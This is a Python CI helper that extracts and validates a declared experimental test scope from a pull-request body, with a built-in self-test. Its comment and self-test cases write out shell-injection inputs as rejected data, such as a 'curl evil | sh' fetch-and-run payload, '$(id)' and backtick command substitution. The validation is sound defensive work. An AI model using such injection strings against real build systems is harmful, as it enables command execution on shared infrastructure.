#!/usr/bin/env python3
"""Extract the declared experimental test scope from a PR body.

Experimental-track PRs declare which tests the experimental CI lane should run,
in a fenced block tagged ``experimental-tests`` (see
``.github/pull_request_template.md``)::

    ```experimental-tests
    tests/experimental/test_foo.py
    tests/experimental/test_bar.py
    ```

Running the whole ``tests/experimental/`` tree gets slower and less relevant as
the track grows, so the author declares what their change actually needs.

The declared value is a ``TEST_PATH`` -- both CI systems drive the same shell
scripts, which already accept one or more files or directories and fan out over
the GPU/toolkit matrix. So this emits a ready-to-use ``TEST_PATH`` rather than
inventing a format.

Why the PR body, specifically: GitLab's ``/bot run TEST_PATH`` carries the
target inline, but GitHub's triggers (the ``run-ci`` label, ``@flashinfer-bot
run``) carry **no argument at all**. The body is therefore the only channel a
GitHub run has for learning what to test, which is what makes a declared block
necessary rather than merely tidy. A GitHub job reads it with::

    TEST_PATH=$(scripts/pr_checks/experimental_test_scope.py \
                  --body-file body.md --test-path)

Note the matrix is unaffected: narrowing ``TEST_PATH`` narrows what runs
*within* each matrix cell, which is where the cost is.

Usage::

    experimental_test_scope.py --body-file body.md      # one target per line
    experimental_test_scope.py --body-file body.md --test-path   # TEST_PATH value
    experimental_test_scope.py --selftest

Exit codes: 0 ok, 1 missing or invalid declaration (message on stderr).
"""

from __future__ import annotations

import argparse
import pathlib
import re
import sys

FENCE_RE = re.compile(
    r"^[ \t]*```[ \t]*experimental-tests[ \t]*\n(.*?)^[ \t]*```[ \t]*$",
    re.DOTALL | re.MULTILINE,
)
ROOT = "tests/experimental/"

# Mirrors MAX_TEST_PATHS in scripts/test_sharding/runner.py. The runner raises
# RunnerStateError deep inside sharding once the scope exceeds this, which surfaces
# as three red GPU lanes and an error from an internal, long after the comment that
# caused it. Rejecting here turns that into an actionable answer on the comment.
MAX_TARGETS = 16

# A target is a path, optionally with a ``::selector`` suffix. Anything outside this
# charset is rejected outright rather than reasoned about: the value reaches a shell,
# and "starts with tests/experimental/ and has no .." accepts
# ``tests/experimental/x.py; curl evil | sh``. That is a legal filename, so the
# existence check is not a reliable backstop either -- it only happens to reject the
# obvious payloads. Keeping the guarantee explicit means callers can state it.
TARGET_RE = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._/-]*(::[A-Za-z0-9_][A-Za-z0-9._\[\]-]*)*$"
)


def parse(body: str) -> list[str]:
    """Return declared pytest targets. Raises ValueError with a fixable message."""
    blocks = FENCE_RE.findall(body or "")
    if not blocks:
        raise ValueError(
            "no ```experimental-tests block found in the PR body. Experimental PRs "
            "must declare their test scope; see .github/pull_request_template.md"
        )
    if len(blocks) > 1:
        raise ValueError(f"found {len(blocks)} experimental-tests blocks; expected 1")

    targets = []
    for raw in blocks[0].splitlines():
        line = raw.split("#", 1)[0].strip()
        if line:
            targets.append(line)
    validate(targets, ROOT)
    if not targets:
        raise ValueError(
            "the experimental-tests block is empty; declare at least one target "
            f"under {ROOT}"
        )
    return targets


def validate(targets: list[str], root: str = ROOT) -> list[str]:
    """Charset- and root-check an already-split list of targets.

    Shared by both entry points so there is one definition of a safe target: the
    declared block (root ``tests/experimental/``) and an explicit list from a
    ``@flashinfer-bot run`` comment (root ``tests/``, since a reviewer may
    legitimately want to run anything).
    """
    unsafe = [x for x in targets if not TARGET_RE.match(x)]
    if unsafe:
        raise ValueError(
            "targets contain characters not allowed in a test path: "
            + ", ".join(unsafe)
        )
    bad = [
        x
        for x in targets
        if not x.split("::", 1)[0].startswith(root) or ".." in x.split("::", 1)[0]
    ]
    if bad:
        raise ValueError(f"targets outside {root}: {', '.join(bad)}")
    # scripts/test_sharding/runner.py cannot take a pytest ::selector. It checks
    # Path(target).exists() (false for "file.py::test_x") and, in collection, branches
    # on is_file() and otherwise rglobs the target as a directory -- so a selector
    # reaches neither branch usefully. The lane would claim GPU runners and then die
    # with "test path does not exist", deep and unactionable. Refuse it here instead.
    selectors = [x for x in targets if "::" in x]
    if selectors:
        raise ValueError(
            "pytest ::selectors are not supported by the test runner; name the file "
            "instead of a single test: " + ", ".join(selectors)
        )
    # Counted after de-duplication, matching how the runner counts.
    unique = len(set(targets))
    if unique > MAX_TARGETS:
        raise ValueError(
            f"too many targets ({unique}); maximum is {MAX_TARGETS} "
            f"(scripts/test_sharding/runner.py enforces the same cap, but only "
            f"after the lanes have started)"
        )
    return targets


def chunk(targets: list[str], limit: int) -> list[str]:
    """Split targets into space-joined chunks of at most ``limit`` characters.

    A GitHub commit status description caps at 140 characters, which fits only two
    or three real test paths (median 41, p90 60), so a scope is published across
    several statuses. Splitting happens on target boundaries -- never mid-path,
    which would produce a chunk that looks like a valid path and is not.
    """
    too_long = [x for x in targets if len(x) > limit]
    if too_long:
        raise ValueError(
            f"target longer than the {limit}-character chunk limit and so cannot be "
            f"split: {', '.join(too_long)}"
        )
    chunks: list[str] = []
    current = ""
    for target in targets:
        candidate = f"{current} {target}" if current else target
        if len(candidate) > limit:
            chunks.append(current)
            current = target
        else:
            current = candidate
    if current:
        chunks.append(current)
    return chunks


def check_exists(targets: list[str], repo_root: str) -> None:
    """Verify each declared target exists. Raises ValueError listing what is missing.

    A declared path that does not exist makes the lane collect nothing and pass,
    which is a false green -- the most expensive way for this to fail, because it
    looks like coverage.
    """
    root = pathlib.Path(repo_root)
    missing = [t for t in targets if not (root / t.split("::", 1)[0]).exists()]
    if missing:
        raise ValueError(
            "declared targets do not exist in the repo: "
            + ", ".join(missing)
            + " (a path that does not exist collects no tests and passes silently)"
        )


def _selftest() -> int:
    ok = [
        (
            "```experimental-tests\ntests/experimental/test_a.py\n```",
            ["tests/experimental/test_a.py"],
        ),
        (
            "pre\n```experimental-tests\ntests/experimental/\n```\npost",
            ["tests/experimental/"],
        ),
        (
            "```experimental-tests\ntests/experimental/t.py  # why\n```",
            ["tests/experimental/t.py"],
        ),
        (
            "```experimental-tests\n\ntests/experimental/a.py\ntests/experimental/b.py\n\n```",
            ["tests/experimental/a.py", "tests/experimental/b.py"],
        ),
    ]
    bad = [
        ("", "missing block"),
        ("```experimental-tests\n```", "empty block"),
        (
            "```experimental-tests\ntests/gemm/test_x.py\n```",
            "outside tests/experimental/",
        ),
        (
            "```experimental-tests\ntests/experimental/../gemm/x.py\n```",
            "path traversal",
        ),
        (
            "```experimental-tests\ntests/experimental/a.py; curl evil | sh\n```",
            "shell metacharacters",
        ),
        (
            "```experimental-tests\ntests/experimental/$(id)\n```",
            "command substitution",
        ),
        ("```experimental-tests\ntests/experimental/`id`\n```", "backticks"),
        (
            "```experimental-tests\ntests/experimental/a.py --collect-only\n```",
            "smuggled pytest flag",
        ),
        (
            "```experimental-tests\ntests/experimental/a.py\n```\n```experimental-tests\ntests/experimental/b.py\n```",
            "two blocks",
        ),
        ("```\ntests/experimental/a.py\n```", "untagged fence"),
        (
            "```experimental-tests\ntests/experimental/a.py::test_x\n```",
            "pytest ::selector the runner cannot consume",
        ),
    ]
    failures = 0
    # check_exists is covered separately: parse() is shape-only by design, so the
    # synthetic bodies above name paths that do not exist.
    import tempfile

    with tempfile.TemporaryDirectory() as td:
        real = pathlib.Path(td) / ROOT
        real.mkdir(parents=True)
        (real / "test_real.py").write_text("")
        try:
            check_exists(
                [f"{ROOT}test_real.py", f"{ROOT}test_real.py::test_x", ROOT], td
            )
        except ValueError as e:
            print(f"FAIL (existing paths rejected): {e}", file=sys.stderr)
            failures += 1
        try:
            check_exists([f"{ROOT}test_missing.py"], td)
            print("FAIL (missing path accepted)", file=sys.stderr)
            failures += 1
        except ValueError:
            pass

    # The cap's whole point is that it EQUALS the runner's, so assert the coupling
    # against the runner's source. Bounds cases written in terms of MAX_TARGETS are
    # self-referential -- they pass at any value, including a drifted one -- so they
    # cannot catch the only failure that matters here. Read the literal rather than
    # importing, which would drag in the runner's dependencies.
    runner_src = (
        pathlib.Path(__file__).resolve().parents[1] / "test_sharding" / "runner.py"
    )
    if not runner_src.is_file():
        print(
            f"FAIL (cannot check cap coupling: {runner_src} missing)", file=sys.stderr
        )
        failures += 1
    else:
        m = re.search(
            r"^MAX_TEST_PATHS\s*=\s*(\d+)", runner_src.read_text(), re.MULTILINE
        )
        if m is None:
            print("FAIL (MAX_TEST_PATHS not found in runner.py)", file=sys.stderr)
            failures += 1
        elif int(m.group(1)) != MAX_TARGETS:
            print(
                f"FAIL (cap drifted: MAX_TARGETS={MAX_TARGETS} but the runner enforces "
                f"{m.group(1)}; a scope this accepts would die inside sharding)",
                file=sys.stderr,
            )
            failures += 1

    # An unsplittable target must surface as a clean ValueError from main()'s guard,
    # not as a traceback, because the caller cannot see the exit status.
    try:
        chunk([ROOT + "t_" + "z" * 200 + ".py"], 140)
        print("FAIL (unsplittable target accepted by chunk)", file=sys.stderr)
        failures += 1
    except ValueError:
        pass

    # Bounds behaviour, relative to whatever the (now-pinned) constant is.
    try:
        validate([f"{ROOT}test_{i}.py" for i in range(MAX_TARGETS)], ROOT)
    except ValueError as e:
        print(f"FAIL (at-cap rejected): {e}", file=sys.stderr)
        failures += 1
    try:
        validate([f"{ROOT}test_{i}.py" for i in range(MAX_TARGETS + 1)], ROOT)
        print("FAIL (over-cap accepted)", file=sys.stderr)
        failures += 1
    except ValueError:
        pass
    # Duplicates do not count toward the cap, matching the runner.
    try:
        validate([f"{ROOT}dup.py"] * (MAX_TARGETS + 5), ROOT)
    except ValueError as e:
        print(f"FAIL (duplicates counted toward cap): {e}", file=sys.stderr)
        failures += 1

    # Chunking: split on target boundaries, never mid-path, and round-trip exactly.
    long_targets = [f"tests/experimental/test_{c}_{'x' * 40}.py" for c in "abcde"]
    cs = chunk(long_targets, 140)
    if any(len(c) > 140 for c in cs):
        print(f"FAIL: chunk exceeded 140: {[len(c) for c in cs]}", file=sys.stderr)
        failures += 1
    if " ".join(cs).split() != long_targets:
        print("FAIL: chunking did not round-trip", file=sys.stderr)
        failures += 1
    if chunk(["tests/experimental/a.py"], 140) != ["tests/experimental/a.py"]:
        print("FAIL: single target should be one chunk", file=sys.stderr)
        failures += 1
    try:
        chunk(["tests/experimental/" + "z" * 200 + ".py"], 140)
        print("FAIL: oversized single target accepted", file=sys.stderr)
        failures += 1
    except ValueError:
        pass

    for body, want in ok:
        try:
            got = parse(body)
        except ValueError as e:
            print(f"FAIL (should parse): {e}", file=sys.stderr)
            failures += 1
            continue
        if got != want:
            print(f"FAIL: got {got}, want {want}", file=sys.stderr)
            failures += 1
    for body, why in bad:
        try:
            parse(body)
        except ValueError:
            continue
        print(f"FAIL (should have been rejected): {why}", file=sys.stderr)
        failures += 1
    print("selftest: FAILED" if failures else "selftest: all cases pass")
    return 1 if failures else 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--body-file", help="file containing the PR body")
    ap.add_argument(
        "--targets",
        help="validate this whitespace-separated list instead of parsing a body "
        "(for arguments supplied to `@flashinfer-bot run`)",
    )
    ap.add_argument(
        "--root",
        default=None,
        help="required path prefix (default: tests/experimental/ for --body-file, "
        "tests/ for --targets)",
    )
    ap.add_argument(
        "--test-path",
        action="store_true",
        help="print targets space-separated as a TEST_PATH value for the CI scripts",
    )
    ap.add_argument(
        "--repo-root",
        default=".",
        help="repo root used to verify declared targets exist (default: cwd)",
    )
    ap.add_argument(
        "--no-check-exists",
        action="store_true",
        help="skip the existence check (parsing/validation only)",
    )
    ap.add_argument(
        "--chunk",
        type=int,
        metavar="N",
        help="print space-joined chunks of at most N chars, one per line "
        "(N=140 matches a GitHub commit status description)",
    )
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        return _selftest()
    if not args.body_file and not args.targets:
        ap.error("one of --body-file / --targets is required (or use --selftest)")
    if args.body_file and args.targets:
        ap.error("--body-file and --targets are mutually exclusive")

    try:
        if args.targets is not None:
            targets = args.targets.split()
            if not targets:
                raise ValueError("no targets given")
            validate(targets, args.root or "tests/")
        else:
            with open(args.body_file, encoding="utf-8") as fh:
                targets = parse(fh.read())
            if args.root:
                validate(targets, args.root)
        if not args.no_check_exists:
            check_exists(targets, args.repo_root)
        # Inside the try: chunk() raises ValueError for a target too long to split,
        # and an uncaught traceback here is worse than it looks -- the caller reads
        # this through `mapfile < <(...)`, which discards the child's status, so the
        # scope silently became "full suite" with no note to the requester.
        chunked = chunk(targets, args.chunk) if args.chunk else None
    except ValueError as e:
        print(f"experimental test scope: {e}", file=sys.stderr)
        return 1
    if chunked is not None:
        print("\n".join(chunked))
    else:
        print(" ".join(targets) if args.test_path else "\n".join(targets))
    return 0


if __name__ == "__main__":
    sys.exit(main())
